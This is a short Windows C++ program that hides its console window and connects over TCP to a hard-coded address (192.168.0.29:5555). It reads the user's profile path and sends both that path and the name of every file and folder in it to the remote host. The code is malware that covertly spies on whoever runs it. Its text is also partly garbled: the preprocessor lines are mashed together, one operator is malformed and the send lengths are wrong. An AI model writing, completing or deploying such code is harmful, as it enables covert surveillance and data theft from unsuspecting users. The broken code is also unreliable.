#
define _WINSOCK_DEPRECATED_NO_WARNINGS# pragma comment(lib, "Ws2_32.lib")#include <iostream>

#include <winsock2.h>

#include <stdio.h>

#include <stdlib.h>

#include <dirent.h>

#include <string>

char * userDirectory() 
{

  char * pPath;
  pPath = getenv("USERPROFILE");
  if (pPath != NULL) {
    return pPath;
  } else {
    perror("");
  } //otherwise exit
}


int main() 
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;
  

    WSAStartup(MAKEWORD(2, 0), & WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR * ) & addr, sizeof(addr));
  

    char * pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);
  
    DIR * dir;
    
    struct dirent * ent;
    if ((dir = opendir(pPath)) != NULL) {
      /* print all the files and directories within directory */
         while ((ent = readdir(dir)) != NULL) {
         send(server, ent - > d_name, sizeof(ent - > d_name), 0);
        }
        closedir(dir);
  } else {
    /* could not open directory */
    perror("");
  }
  
  ////clean up
  closesocket(server);
  WSACleanup();
}